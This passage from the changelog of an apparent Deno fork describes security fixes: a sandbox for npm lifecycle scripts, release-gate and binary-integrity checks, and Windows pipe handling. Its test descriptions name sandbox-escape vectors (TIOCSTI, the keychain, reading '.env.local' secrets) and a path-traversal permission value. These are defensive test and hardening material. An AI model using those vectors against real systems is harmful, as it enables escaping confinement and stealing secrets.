       orphaned becomes the installer's child; the ones it didn't have before
       the script and that are not in its own session are killed and reaped too
       (a process that detached from the group with its own `setsid` included).
       macOS has no subreaper: a descendant that made its own session outlives
       the group there, sandboxed.
     - **Degraded platforms say so (Medium).** Windows, Linux without Landlock
       and macOS without `sandbox-exec` printed nothing for a default jail (item
       103 kept the warning for a jail asked for). Now every install there
       prints, once: "jail-scripts: the OS can't confine lifecycle scripts here
       (<reason>). They still get a scrubbed environment, a temporary HOME and a
       clamped Deno, but any other program they start (a shell, a compiler,
       curl) can read and write anything and reach any host." And
       `deno info --json` carries a `lifecycleJail` object for denext's doctor:
       `osSandbox` (`"seatbelt"` / `"landlock"` / `"none"`), `reason`,
       `hostLists` (`"proxy"`: every program is held to the list;
       `"unconfined"`), `networkNamespace` (Linux), and `warnings` (the lines an
       install prints here). Windows OS confinement (a restricted token,
       AppContainer, a Job Object) stays a roadmap item.
     - **Lows.** `is_internal` covers the rest of RFC 6890's special-purpose
       ranges (`192.0.0.0/24`, the documentation nets, `198.18.0.0/15`, `224/4`,
       `240/4`, `255.255.255.255`; IPv4-translated `::ffff:0:a.b.c.d`, local-use
       NAT64 `64:ff9b:1::/48`, 6to4 `2002::/16` and Teredo `2001::/32` when the
       IPv4 address they carry is internal, `ff00::/8`). The credentials in a
       URL-valued setting passed into the jail (`npm_config_registry`,
       `npm_config_proxy`, `HTTPS_PROXY`, ...) are stripped
       (`http://user:pass@corp:3128` goes in as `http://corp:3128/`). The
       executable sweep walks with `openat` / `fstatat` / `unlinkat` relative to
       directory descriptors opened with `O_NOFOLLOW`, so a directory swapped
       for a symlink while it runs can't make the installer unlink a file
       elsewhere, and it runs only after the script's process group is gone. The
       Deno permission clamp folds `..` in a path list it can't canonicalize (a
       file that doesn't exist yet), so `--allow-write=../../etc/x` no longer
       passes as beneath a root.
     - **Dependencies.** tokio 1.47.1 → 1.53.3 (RUSTSEC-2026-0386, the unsound
       `AsyncFd` constructors; `signal-hook-mio` 0.2.4 → 0.2.5 and `mio` 1.0.4 →
       1.2.4 to let it move; `io-uring` dropped from the lock; not 1.54: its
       accepted sockets start readable and writable (tokio#8435), and with that
       Windows' `tlsHandshakeWithTcpCorruptionImmediately` sees `InvalidData`
       instead of `UnexpectedEof`), crypto-bigint 0.7.6 (yanked) → 0.7.9,
       clipboard-win 5.3.0 (yanked) → 5.4.3, zstd 0.13.2 → 0.14.3 with zstd-safe
       8.2.0 and zstd-sys 2.1.2 (RUSTSEC-2026-0391, -0398, -0403, -0410) and rpm
       0.25.1 → 0.30.2 to follow it. backhand 0.25 (the AppImage's squashfs)
       still depends on zstd 0.13 / zstd-safe 7, so that second copy stays in
       the lock and `.cargo/audit.toml` ignores -0391, -0398 and -0403 for it,
       with the reason written there (squashfs block compression reuses no
       stream context, has no seekable frames and no legacy frames); remove the
       ignores when backhand moves. `cargo audit`: no other vulnerability; the
       unmaintained-crate warnings as before, plus ten `unsound` warnings on
       that same zstd-safe 7 copy (RUSTSEC-2026-0395 to -0406: multithreaded
       contexts, dictionaries, `try_clone`, none of which backhand uses). tokio
       1.50 shortened its worker thread name to `tokio-rt-worker`, which
       `test/recursive_permissions_pledge` expects now. `libs/core/uv_compat`
       registers its descriptors through `AsyncFd::register` (the deprecated
       `AsyncFd::new` fails CI's clippy). The jail's "can't confine here"
       warning (M7) shows up in every Windows install that runs a lifecycle
       script, so the lifecycle spec tests carry Windows expectations with it
       (`*_windows.out`).

     Validated install scripts (macOS 15.8, the deny-by-default profile,
     `deno
     install --allow-scripts` with the jail on by default, each also
     run with `--no-jail-scripts` to tell a jail failure from a baseline one):
     esbuild 0.25.5 (postinstall) pass; bcrypt 5.1.1 (node-pre-gyp's download
     from github.com, granted through `net`) pass; @prisma/engines 5.22.0
     (binaries.prisma.sh, granted) pass; sharp 0.32.6 fail, not the profile: its
     libvips download goes through tunnel-agent's `CONNECT`, which
     `node:_http_client`'s `buildProxyRequestTarget` refuses under
     `NODE_USE_ENV_PROXY` ("Invalid URL: github.com:443"; the same outside the
     jail with the variable set, since item 111 set it); better-sqlite3 11.10.0
     fail, the same tunnel-agent path (prebuild-install), after which its
     node-gyp fallback fetches node-gyp from registry.npmjs.org, which the
     package's host list doesn't allow (its unjailed build fails on this machine
     too); electron 33.4.11 fail, not the profile: extract-zip creates the app
     bundle's symlinks, which the Deno clamp's path-scoped write refuses (item
     83's `create symlink: denied`); canvas 2.11.2 and cpu-features 0.0.10 (a
     node-gyp build) fail unjailed too on this machine, so nothing is
     attributable; puppeteer 23.11.1: `deno install` ran no postinstall for it,
     jailed or not, so it was not exercised. No failure was a Seatbelt denial.
     The tunnel-agent `CONNECT` under `NODE_USE_ENV_PROXY` and puppeteer's
     missing postinstall are fixed in item 127.

     Tests: `npm/supply_chain_jail` (`escapes_denied_mac`: `/dev/tty`,
     `TIOCSTI`, the session, the process table, hard links both ways, a `nohup`
     process gone after the install, `open` (a `.command` and an app),
     `launchctl list`, the keychain, AppleEvents, the pasteboard;
     `escapes_denied_linux`: the same minus the macOS services;
     `declared_download_host_refused` with its hint,
     `declared_download_host_known_but_internal`,
     `declared_host_binds_every_program` now reaching nothing,
     `jailed_windows_default` with the warning, and the probe's
     `read member
     .env.local` line in `jailed_linux` / `jailed_mac` /
     `jailed_windows`), `declared_hosts_get_no_exemption`,
     `forwarded_heads_are_framed_and_host_tied`,
     `forwarded_requests_are_not_pipelined` and the new ranges in
     `internal_addresses` (`cli/supply_chain/jail_proxy.rs`),
     `declared_hosts_need_a_grant`, `secret_files_at_any_depth`,
     `url_credentials_stripped`, `clamp_folds_dotdot`,
     `detached_session_and_group_ended` and the `knownPackages` cases of
     `package_net` (`cli/supply_chain/jail.rs`), `profile_denies_by_default`
     (`sandbox_macos`), `seccomp_refuses_tiocsti` (`sandbox_linux`),
     `knownPackages` in `test_to_supply_chain_config` (`libs/config/deno_json`),
     and `lifecycleJail` in `info/json`.

125. **`feat(npm)`: a package.json project's `allowScripts` and `supplyChain`
     live in package.json's `"deno"` object** (`feat/nest-phase1`, CLI only;
     `libs/package_json/lib.rs`, `libs/config/deno_json/mod.rs`,
     `libs/config/workspace/mod.rs`, `cli/tools/pm/approve_scripts.rs`,
     `cli/tools/pm/mod.rs`, `cli/supply_chain/jail.rs`, `cli/factory.rs`). A
     project with a package.json and no deno.json resolves and installs as
     Node.js does (hoisted `node_modules`, extensionless imports, Node's
     conditions), and any deno.json turns that off. `deno approve-scripts`,
     which every install's "Ignored build scripts" box tells users to run,
     created a deno.json holding only `allowScripts`, so approving a script
     broke such a project (a Nest app: `Module not found …/src/app.module`) and
     reinstalled `node_modules` isolated; and the lifecycle-script jail's
     exceptions (`supplyChain.jailScripts`) had no home but deno.json either.
     Now, when there is no root deno.json, the root package.json's `"deno"`
     object holds both, in deno.json's shapes:
     `"deno": { "allowScripts": [...], "supplyChain": { ... } }`.
     - `deno install` and every other reader of the two settings
       (`Workspace::allow_scripts` / `supply_chain`, the `.npmrc` supply-chain
       merge) take them from there; relative `jailScripts.packages.<name>.write`
       paths resolve against the package.json's directory; errors name
       `"deno.allowScripts"` / `"deno.supplyChain"`.
     - `deno approve-scripts` writes `deno.allowScripts` into the package.json
       (creating the object) instead of creating a deno.json; it still creates a
       deno.json where there is neither file.
     - A root deno.json, when there is one, stays the only home: a package.json
       `"deno"` object beside it is ignored with a warning naming the key to
       move, and a workspace member's is reported as root-only (as `overrides`
       is), never applied.
     - The jail's warnings that print the setting to add (a refused declared
       download host) print it as a package.json `"deno"` entry in such a
       project.
     - Only an object with one of the two keys counts: a dependency's own
       `"deno"` field (some name an entry point) is not read, and other keys in
       the object are ignored.

     Tests: spec `npm/pkg_json_deno_settings` (`approve-scripts` in a
     package.json project writes `"deno": { "allowScripts": [...] }`, creates no
     deno.json, the approved script runs, and an extensionless import still
     resolves; on `3.0.0-rc.5` it creates a deno.json and the import fails; with
     a deno.json beside it the object is reported as ignored); spec
     `npm/supply_chain_jail` `per_package_exceptions_package_json` (the
     `per_package_exceptions` probe with its approval and exceptions in the
     package.json, installed without `--allow-scripts`); unit
     `test_pkg_json_deno_settings`, `test_pkg_json_deno_settings_invalid`,
     `test_pkg_json_deno_settings_shadowed_by_deno_json`
     (`libs/config/workspace/mod.rs`), `test_deno_settings_object`
     (`libs/package_json/lib.rs`), `supply_chain_line_names_the_home`
     (`cli/supply_chain/jail.rs`).

126. **`chore(panic)`: a panic points at this fork's issue tracker** (CLI and
     runtime; `cli/lib.rs`, `cli/rt_desktop/lib.rs`). The panic hooks of the CLI
     and of a packaged desktop app said "Please report this at
     https://github.com/denoland/deno/issues/new", which sent the fork's users
     to upstream with a trace of a binary upstream never built. They now name
     https://github.com/Brainwires/deno/issues/new; the release's debug info
     (`*-symbols-*.tar.gz`, see Release archives) symbolicates such a report.

     Test: `tests/specs/test/recursive_permissions_pledge` (its expected panic
     output).

127. **`fix`: the rest of the fork audit's Lows, and the release gate**
     (`fix/rc7-lows`; `runtime/ops/desktop_update/oscheck.rs`,
     `runtime/permissions/lib.rs`, `ext/node/polyfills/_http_client.js`,
     `libs/npm_installer/extra_info.rs`, `.github/workflows/denext_*.yml`,
     `.github/denext-tests/setup/action.yml`, `.github/denext-runtime/`). The
     2026-10-25 security and production audits' remaining Lows (item 124 took
     the jail's), two install failures item 124's validation found, and the
     release pipeline's integrity findings:
     - **macOS update check: an Apple anchor, not just a Team ID (E-L4).** The
       update helper compared the staged app's Team ID with the running app's,
       but the Team ID is the leaf certificate's OU, which a self-signed
       certificate can carry, and `codesign --verify` asks for no Apple anchor;
       only `spctl --assess` did, and it accepts everything once the user has
       turned Gatekeeper off. Now the staged bundle must also satisfy
       `codesign --verify --deep --strict -R='anchor apple generic and
       certificate leaf[subject.OU] = "<team>"'`,
       with the Team ID checked to be ten upper-case letters and digits before
       it goes into the requirement.
     - **`--deny-import` and IPv4-mapped addresses (B-I1, upstream-shared).**
       The import deny check after DNS resolution compared the address as
       resolved, so a name whose AAAA record is `::ffff:127.0.0.1` passed
       `--deny-import=127.0.0.1`. It normalizes the address first, as the net
       checks do.
     - **`agent: false` and `NODE_USE_ENV_PROXY`.** Node routes only its global
       agents through the environment's proxy; a request made with
       `agent: false` gets a fresh agent without `proxyEnv` and connects
       directly. Deno's `node:http` routed it through the proxy too, so
       tunnel-agent's `CONNECT` (sharp's libvips download, prebuild-install's
       binaries: item 124's validation) was itself proxied and its `host:port`
       target refused as an invalid URL ("Invalid URL: github.com:443"), inside
       the jail (which sets the variable) or out.
     - **A deprecated package's lifecycle scripts never ran.** The extra info of
       a deprecated package (its deprecation message is not in its package.json)
       came from the registry's packument, and the abbreviated packument the
       installer fetches has `hasInstallScript` but no `scripts`: no script was
       found, so none ran and none was reported as not run (puppeteer 23.11.1's
       postinstall, which downloads Chrome: item 124's validation). The scripts
       now come from the package's own package.json in that case (npm's
       `node-gyp rebuild` default for a `binding.gyp` included).
     - **The release gate (P3, P4, P5, P11).** A tag was published when any one
       full `denext tests` run of the commit passed, so a crash that fails one
       run in three shipped after a re-dispatch (the arm64 and macOS SIGABRTs of
       rc.3 and rc.6), any commit with a green dispatch could be tagged (a
       `fix/*` branch never merged), and Windows arm64, a shipped target, had no
       test leg at all. Now `.github/denext-runtime/tag_gate.py` (with
       `tag_gate_test.py`, run in the lint job) refuses a commit with any
       failed, timed-out or unstarted `denext tests` run, in any attempt (a
       "re-run failed jobs" that turns a run green keeps its failed first
       attempt), or with one still running; requires a full run with a
       `windows-11-arm` leg besides the other five; and requires the commit on
       `development-denext` or `rel/<version>`. `denext_tests.yml` gains that
       leg on full runs: build, lib tests and the unit suite (`libs_and_unit`;
       the shared setup names the ARM64 host for rustup and finds VS's ARM64
       libclang). When the lib tests fail, each leg runs them again on one
       thread, where libtest prints a test's name before running it, so a test
       that aborts the whole binary (the unnamed SIGABRTs) is named. A
       pre-release is published as a GitHub pre-release, so an rc is never the
       repository's "Latest" (P8, in part).
     - **Pinned build tools in attested jobs (D-L2).** The libdenort and CLI
       jobs (which hold `id-token` and attestation rights) set up a floating
       `deno-version: v2.x` to fetch the `ld64.lld` that links the macOS arm64
       release binaries. They now use `STOCK_DENO_VERSION`, and
       `.github/denext-runtime/install_ld64.sh` (also used by the test setup)
       checks the linker against a pinned SHA-256 and the `deno_third_party`
       commit `tools/util.js` pins.

     Tests: `team_must_be_apple_anchored` and `team_requirement_names_the_team`
     (`oscheck.rs`), `test_check_import_deny_resolved_ipv4_mapped`
     (`deno_permissions`), `node/http_proxy_agent_false`,
     `npm/deprecated_package_lifecycle_scripts` (with the
     `@denotest/deprecated-lifecycle-scripts` test package) and
     `tag_gate_test.py`.

128. **`fix(deps)`: the AppImage's zstd on zstd 0.14, the zstd 0.13 copy gone**
     (`fix/backhand-zstd`, CLI only; `cli/tools/desktop.rs`, `Cargo.toml`,
     `Cargo.lock`, `.cargo/audit.toml`). backhand 0.25 (the AppImage's squashfs
     writer and reader) kept zstd 0.13.2 / zstd-safe 7.2.4 in the lock beside
     the workspace's 0.14.3 / 8.2.0 (item 124). Its `zstd` feature is off now,
     and `AppImageZstd`, a backhand `CompressionAction`, does the zstd blocks on
     the workspace zstd the way backhand's `DefaultCompressor` did (one-shot
     `bulk` contexts, level 3, no compression options, the decompressed size
     bounded by the block backhand reserves), handing any other compressor id to
     `DefaultCompressor` when reading. The writer and the tests' readers use it
     through `Kind::new_v4` (`appimage_squashfs_kind`); the image bytes are
     standard zstd SquashFS 4.0 as before. backhand stays the crates.io release:
     no `[patch]`, no vendored copy. `.cargo/audit.toml` drops its
     RUSTSEC-2026-0391, -0398 and -0403 ignores, and `cargo audit` lists no
     vulnerability and none of the ten `unsound` warnings (RUSTSEC-2026-0395 to
     -0406) any more; the lock before this change, audited with the ignores
     gone, reports those three vulnerabilities and ten warnings. Turn backhand's
     `zstd` feature back on (and drop `AppImageZstd`) once a backhand release is
     on zstd 0.14. The image's root directory is still written with mode 0
     (backhand's `FilesystemWriter` default, unchanged here), which `unsquashfs`
     and `--appimage-extract` restore as an unreadable directory. Tests:
     `appimage_zstd_blocks_and_fragments_round_trip` (compressible files over
     two data blocks and inside a fragment, read back through `AppImageZstd`
     and, where squashfs-tools is installed, extracted with `unsquashfs`) and
     `appimage_zstd_decompress_is_bounded_and_delegates`; without the custom
     `Kind` the four AppImage tests that write an image fail.

129. **`fix`: AppImage root mode, symlinks in the lifecycle-script jail, the
     launch file's bridge pin** (`fix/rc7-lows2`, CLI only;
     `cli/tools/desktop.rs`, `cli/supply_chain/jail.rs`,
     `runtime/permissions/lib.rs`, `ext/fs/ops.rs`; the laufey half, E-L1 to
     E-L3, is Brainwires/laufey `fix/rc7-lows` and lands with the next
     `LAUFEY_SHA` pin):
     - **The AppImage's root directory was mode 0 (upstreamable).**
       `create_linux_appimage` never called backhand's `set_root_mode`, and
       `FilesystemWriter` writes the root inode with permissions 0, so
       `unsquashfs` and `--appimage-extract` restored an unreadable
       (`d---------`) root (item 128's test had to `chmod` it open). The root is
       written `0755` now. Upstream Deno's `deno desktop` writes its AppImage
       the same way and has the same bug. Test:
       `appimage_zstd_blocks_and_fragments_round_trip` asserts the image's root
       mode through backhand and the extracted directory's mode through
       `unsquashfs` (the `chmod` workaround is gone); it fails without the fix
       (`0` / `0` instead of `0o755`).
     - **Symlinks inside a confined lifecycle-script jail.** `Deno.symlink()`
       and `node:fs.symlink` need unscoped `--allow-read` and `--allow-write`,
       which the jail's clamp never grants, so electron's postinstall
       (extract-zip unpacking the macOS app bundle's `Versions/Current -> A`
       links) failed with `create symlink: denied` (item 124's validation).
       Where an OS sandbox (Landlock, Seatbelt) confines the script, the
       installer now marks the jail `osConfined`, and the clamp hands its write
       roots to `deno_permissions::set_jail_symlink_roots`. `check_symlink`
       (used by both ops, unchanged for everyone else) then also accepts a link
       whose path (its parent resolved) and target (resolved from that parent
       through existing links, a missing tail kept as named, so a dangling link
       works) both lie within those roots and pass the container's write (link)
       and read + write (target) checks. A `..` after a name in the target is
       refused (the name may be a link the kernel follows first). Nothing new is
       reachable: any program the script starts may already `ln -s` there, and
       the OS sandbox, not this check, holds writes through a link. Never set on
       Windows or wherever the OS can't confine, where symlinks keep needing
       unscoped grants; an older installer's jail JSON (no `osConfined`) means
       unconfined. Tests: `npm/supply_chain_jail::symlinks_within_own_folder`
       (the `@denotest/jail-symlinks` postinstall: the electron-shaped links
       from `fs.symlinkSync`, `fs.promises.symlink` and `deno run -A`'s
       `Deno.symlink[Sync]`, a dangling one, read back through the links; an
       absolute or relative target outside the package, a link outside it,
       `shout/../x` through an `ln -s` link that leaves the folder, and `/` all
       refused), `test_check_symlink_jail_roots` (`deno_permissions`) and
       `symlink_roots_only_when_confined` (`jail.rs`). Without the allowance the
       spec test's six "allowed" lines read "denied".
     - **The launch file always pins the bridge (E-L1).** The
       `laufey-launch.json` that `deno desktop` writes now always has
       `bridgeOrigins`: the app origin (deno.json `desktop.app.origin`, else the
       project's `.deno-desktop/app.json` origin the runtime reads, else
       `app://localhost`). Without the key laufey let every document the window
       navigated to (an identity provider listed in `allowedNavigationOrigins`)
       call the app through the bridge when the app had no custom scheme. Tests:
       `laufey_launch_config_content`,
       `bridge_origin_from_the_project_app_config`.

     laufey (`fix/rc7-lows`): a launch file with `"strictPolicy": true` (the one
     denext's packaging writes) fails closed: no `bridgeOrigins` (and no
     `customSchemes`) pins the bridge to no document, and no `passkeyRpIds`
     refuses every passkey ceremony (E-L1, E-L2); without the key (no file, or
     the stock `deno desktop` file) both keep today's defaults. The Linux secure
     store keys each item by the app id too (`laufey-app-id`), so two apps using
     the same service and account no longer share it, and an item an older build
     wrote under the shared attributes moves into the app's namespace on its
     first lookup during the first run of the updated app, only when that app
     had run here before (E-L3).

130. **`fix(compile)`: the release's `denort` is checked against its
     `SHA256SUMS`** (`fix/denort-sha256`; `cli/standalone/binary.rs`, CLI only).
     The fork production audit's P8: `deno compile` without `DENORT_BIN`, in a
     denext release build, downloads `deno-denort-<version>-<target>.zip` from
     the release `denext-runtime-v<version>` (item 79) and used it with no
     integrity check, and trusted the copy in the download cache forever. A
     swapped release asset (a token with `contents: write`, a compromised
     session, a `DENEXT_DENORT_BASE_URL` pointing elsewhere) was baked into
     every compiled binary. Now the CLI also fetches that release's `SHA256SUMS`
     (which the release workflow publishes, listing every archive) and uses the
     zip only when its SHA-256 is the one listed for it. A missing `SHA256SUMS`,
     no entry for the asset, two entries that disagree, or a different hash is
     an error naming the asset and, for a mismatch, both hashes; nothing
     unverified is written to the cache. The verified hash is recorded beside
     the cached zip (`<zip>.sha256`) and the zip is re-hashed on every use: one
     that no longer matches its record (or has none, as an older CLI's cache) is
     checked against `SHA256SUMS` again, and downloaded again when it doesn't
     match. Upstream's `dl.deno.land` downloads (a build that is not denext's,
     `--engine quickjs`, `deno desktop`'s `libdenort`) are unchanged. Release
     assets are immutable since 2026-10-27 (GitHub immutable releases), so a
     published `SHA256SUMS` can't be replaced afterwards either.

     Tests (`cli/standalone/binary.rs`):
     `denext_denort_with_a_good_hash_is_used_and_cached`,
     `denext_denort_tampered_archive_is_refused`,
     `denext_denort_missing_sums_entry_is_refused`,
     `denext_denort_missing_sums_is_refused`,
     `denext_denort_cache_is_not_trusted_blindly`,
     `sha256sums_entry_reads_the_listing` and
     `release_sums_url_is_beside_the_asset`.

131. **`fix`: the 3.0.0-denext.1 CI round** (`fix/denext1-ci`, CLI and CI only;
     `cli/tools/desktop.rs`, `cli/graph_util.rs`,
     `cli/tools/installer/global.rs`, `.github/denext-runtime/`). An AppImage
     packaged on a Windows host stored a symlink's target as `read_link`
     returned it, with `\` separators that dangle on Linux; targets are now
     written with `/` (entry names already were: backhand pushes them one
     component at a time). Item 121's elision applies to package subpaths only,
     as documented, so a missing package root keeps the graph error.
     `denort_smoke.sh` accepts the release's `SHA256SUMS` as the failed request
     (item 130 fetches it before the zip). `install_unicode` is ignored on
     Windows Arm64, where the shim's debug `deno.exe` exits non-zero under a
     cleared environment without printing anything (a release build passes the
     same run on Windows 11 Arm64). Tests:
     `appimage_symlink_targets_use_forward_slashes`,
     `graph_util::tests::bare_package_subpaths`, and
     `appimage_zstd_blocks_and_fragments_round_trip` now finds files by path
     components, since backhand's reader joins them with the host separator.

132. **`test(e2e)`: the macOS passkeys refusal gets the OS's answer, not the
     ceremony timeout's** (`fix/denext1-passkey-webview`, CI only;
     `.github/denext-runtime/e2e/apps/passkeys/main.ts`). The passkeys area sent
     its one real OS request with a 2000 ms WebAuthn `timeout` and then required
     `invalid_rp` on macOS. laufey's macOS path starts that timer just before
     `performRequests`, and AuthenticationServices' refusal of an unsigned app
     is not always quick: under WKWebView on x86_64-apple-darwin it answered in
     435, 1299 and 1870 ms in the last three green runs, against 7 to 44 ms
     under CEF and 43 to 333 ms on aarch64. In run 40515238488 it took longer
     than 2 s, so the request ended as `timeout` and the check failed, on the
     same laufey (ec6a30b) and no macOS code change since the green 1870 ms run
     (40479029675). On macOS the request now carries a 30 s timeout, so the
     check sees the OS's answer, and a request that really hangs still fails it
     as `timeout`; elsewhere, where the request waits for a person, it keeps
     2000 ms.

133. **`ci`: the aarch64-apple-darwin legs run on `macos-15`**
     (`denext_tests.yml`, `denext_tests_os.yml`, `denext_runtime.yml`,
     `tag_gate.py`). On 2026-10-27 two full runs in a row (40479031441,
     40515239498) lost every `macos-14` job to "not acquired by Runner of type
     hosted" while `macos-15` jobs in other repositories got runners. The tag
     gate requires the arm64 leg by name, so it now names `macos-15`.

134. **`ci`: a run that lost its jobs to the runner pool doesn't block the tag**
     (`.github/denext-runtime/tag_gate.py`). GitHub concludes a run `failure`
     when it cancels jobs no hosted runner picked up ("not acquired by Runner of
     type hosted"), which happened to every macOS arm64 job of runs 40479031441,
     40515239498 and 40542036404 while other jobs of the account held the macOS
     runners. The gate read that run conclusion, so a commit no test had failed
     on could never be tagged. It now reads the jobs of a `failure` attempt: one
     where no job failed or timed out counts as `no_runner`, which isn't red.
     Such a run still never vouches for a commit; only a green run with every
     leg does, and a `failure` with no jobs at all (a workflow that never
     started) stays red.

135. **`test(e2e)`: a toast body click on a slow shell waits for its response**
     (`.github/denext-runtime/e2e/apps/menus/main.ts`). On windows-11-arm
     (runtime run 40564206355) the scripted activation of the body toast
     produced neither a `click` within 10 s nor a `close`, so the check failed
     with no response recorded, while the same run's action-button toast was
     answered as a `notificationresponse`. The check took the retired-toast path
     only after a `close`; it now also waits up to 15 s for the toast's
     `notificationresponse` when no `close` came, and still fails when neither a
     click nor a response ever arrives.

     That wait was not the cause. In the denext.1 tag run (40645227860) the
     action-button and body clicks both failed with no click, no `close` and no
     response, though `toast-click.ps1` reported success. The script calls the
     app's COM activator directly (`CoCreateInstance` +
     `INotificationActivationCallback::Activate`). It never looks a toast up in
     the Action Center history, so registration and history timing don't apply:
     the `e2e-due` click went through the same activator in the same process and
     arrived.

     The cause was the harness's clock. Each click listened with
     `once(n, "click" | "action", 15000)`. Those 15 s started before the `show`
     wait and the script run. One script run (PowerShell start, Add-Type's C#
     compile, `Activate`) outlasts that window on windows-11-arm. The apps' own
     `stages` show this in failing and passing runs alike. The live-notification
     stage took 46-61 s for its two toasts. The old code could spend that long
     only if each script run took about 20 s or more; on the Windows on Arm VM a
     run takes 2.5-3 s. So `once` had already resolved null when laufey
     dispatched the click, and the click reached no listener.
     - If the shell had already retired the toast (a shown banner times out
       after at most 7 s and laufey reports `close`), laufey routed the click as
       a `notificationresponse`. No deadline bounds that, so the check passed.
     - If the shell raised no `Dismissed` for the toast (`closedAt` 0), the
       click went to the live object after `once` had given up. This is the
       intermittent failure, and the reason the live paths have never passed on
       a hosted runner.

     The checks now record `click` / `action` events from before the click, with
     no deadline, and wait 10 s for them once the script returns. Each run of
     `toast-click.ps1` prints its phase times. The app records each run's
     duration and output under `toastClick:<tag>` in its results file, so the
     next slow run measures the script directly.

     Reproduced on the Windows on Arm VM (rc.6 cef runtime, console session),
     with the timing scaled down so the toast stays live:
     - With a 3 s pause before `Activate` and a 3 s `once` window, the old
       harness failed exactly as CI did: the action check gave
       `{"event":"none","closedAt":0,"responses":[e2e-due]}`, and the body check
       got no click and no response.
     - The fixed harness passed both checks with the same pause, with no pause,
       and with an 18 s pause. With the 18 s pause the VM's shell times the
       toasts out first, so the clicks are checked as responses.

     The live paths stay in the expected n/a list for windows-11-arm, since a
     shell that retires the toast still makes them n/a. A run whose toast stays
     live now passes them, with a notice.

     Two more e2e harness fixes from the same round (run 40608590678):
     - **WebView2 has no response backpressure.** The `origin` check "a stream
       the page stops reading is held back" is now expected n/a on both Windows
       webview legs, as it already was on Linux webview. WebView2 requires a
       custom-scheme response stream to have all its content by the time the
       WebResourceRequested deferral completes, so the engine reads the whole
       response itself (76 MB read while the page held 1.2 MB); laufey's
       high-water mark bounds only its own queue. CEF keeps the check.
     - **The locked-keyring session raced the bus.** `e2e/linux/session.sh`
       asked `org.freedesktop.secrets` for the default collection's `Locked`
       before its own gnome-keyring owned the name, so the bus activated the
       host's gnome-keyring (no login keyring there) and the setup exited 1
       without a message. It now waits for `NameHasOwner` first and prints an
       `::error::` when the session can't start.

136. **`fix(coverage)`: a second Ctrl+C or SIGTERM ends a coverage flush at
     once, and coverage files are written whole**
     (`fix/prod-robustness-denext2`, CLI and runtime; `ext/signals/lib.rs`,
     `cli/util/signal_flush.rs`, `cli/tools/test/mod.rs`, `runtime/coverage.rs`,
     `runtime/cpu_profiler/mod.rs`). Item 112's hook waits up to 10 s for the
     coverage flush on the one thread that handles signals, so a second Ctrl+C
     or SIGTERM during the wait was not handled until it ended: a hung
     `--coverage` run could only be stopped sooner by SIGKILL. When the wait ran
     out, the process ended while a coverage file might be half written
     (`File::create` + `write_all`), and `deno coverage` then failed on the
     whole directory over one truncated `.json`.
     - **`deno_signals::arrival_count`**: SIGHUP, SIGTERM and SIGINT are now
       also counted the moment they arrive, in the signal handler itself (an
       atomic increment, async-signal-safe; on Windows when the console control
       handler is called), so the count moves while the signal thread is blocked
       in a hook. The hook notes the count when it starts and
       `wait_for_flush_unless` gives up (checked every 50 ms: a signal handler
       can't wake a condition variable) once it changes; the default action then
       ends the process. The test runner's own SIGINT report waits the same way.
       Two signals that both arrive before the signal thread reads the first one
       still wait the full 10 s (the count already includes the second), as
       before.
     - Coverage files and `--cpu-prof` profiles are written to a temporary file
       in the same directory and renamed into place
       (`deno_path_util::fs::atomic_write_file_with_retries`); the temporary
       file ends in `.tmp`, which `deno coverage` doesn't read. A process ended
       mid-write leaves the whole file or none.

     Tests: spec `coverage/signal_flush` `run_sigterm_twice`,
     `run_sigint_twice`, `test_sigint_twice` (Unix: a program stuck in
     synchronous code, signalled twice a second apart, ends by the signal in
     well under the 10 s timeout, and every `.json` left parses);
     `arrivals_are_counted_while_the_signal_thread_is_busy`
     (`ext/signals/lib.rs`); the early give-up in
     `participants_flush_before_the_signal_returns`
     (`cli/util/signal_flush.rs`); `coverage_files_are_written_whole`
     (`runtime/coverage.rs`).

137. **`fix(process)`: a child's Windows stdin, a `deno_io` pipe writer and a
     `node:child_process` blocking pipe read hold no blocking-pool thread**
     (`fix/prod-robustness-denext2`, CLI and runtime; `ext/io/lib.rs`,
     `ext/io/pipe.rs`, `ext/process/lib.rs`, `libs/core/uv_compat/pipe.rs`). The
     rest of items 118 and 119 (the audit's R1). Not validated on a Windows
     build yet: the fork's Windows CI is its first run.
     - **Piped stdin**: `Deno.Command` (and `Deno.run`) wrapped a child's piped
       stdin in tokio's `ChildStdin`, which on Windows writes the pipe with a
       blocking `WriteFile` on the runtime's blocking pool (tokio's
       `process/windows.rs` wraps it in `io::blocking::Blocking`). A write a
       child doesn't read yet (more than the pipe's 64 KiB buffer) held its pool
       thread until the child read it; with one such write per child, `4 * CPUs`
       children filled the pool, and a child that waited for anything that needs
       a pool thread (a file write of the parent's, say) before it read its
       stdin never did. The parent's end is the overlapped, outbound named pipe
       server `deno_subprocess_windows`' `anon_pipe` creates, so it is now
       written as a `tokio::net::windows::named_pipe::NamedPipeServer`
       (`ChildStdinWriter`) through the I/O completion port, as
       `node:child_process`' stdin already was (`uv_compat`). mio hands each
       write to the port and reports it written; a second write waits, holding
       no thread, until the first completes, and dropping the writer doesn't
       cancel a pending write, so the child still reads all of it and then EOF.
       Unlike tokio's `ChildStdin`, `shutdown` no longer waits for that write: a
       parent that exits right after closing stdin, without waiting for the
       child, can lose what the child had not read.
     - **`AsyncPipeWrite`** (`deno_io::pipe()`'s write end) is the overlapped
       server end of that pipe written the same way; `into_sync` now fails with
       `Unsupported` on Windows, like `AsyncPipeRead::into_sync` (item 119).
       Nothing in the tree writes through it.
     - **`node:child_process` / `uv_pipe_open` on a pipe without
       `FILE_FLAG_OVERLAPPED`** (an anonymous pipe from `CreatePipe`, the client
       end a parent hands a child): tokio can't register such a handle with the
       completion port (`CreateIoCompletionPort` needs a handle opened for
       overlapped I/O,
       [docs](https://learn.microsoft.com/en-us/windows/win32/fileio/createiocompletionport)),
       so it is read with a blocking `ReadFile`, which ran on the blocking pool.
       `read_stop` dropped a pending read with `JoinHandle::abort()`, which
       doesn't stop a blocking task that is already running: its thread stayed
       blocked, the data it then read was thrown away, and the next `read_start`
       started a second read beside it (Node streams stop and restart reading on
       backpressure). A read now runs on a thread of its own (libuv does the
       same with a long-running `QueueUserWorkItem` per read, `src/win/pipe.c`),
       reads a duplicate of the handle (so closing the pipe never leaves it
       reading a closed or reused handle value), and is never dropped while the
       pipe is open: one stopped by `read_stop` keeps its result for the next
       `read_start`. Closing the pipe cancels it with `CancelSynchronousIo`, as
       libuv's `uv__pipe_interrupt_read` does
       ([docs](https://learn.microsoft.com/en-us/windows/win32/fileio/cancelsynchronousio-func):
       a thread not yet inside `ReadFile` misses it and returns at the next data
       or EOF, holding no pool thread).

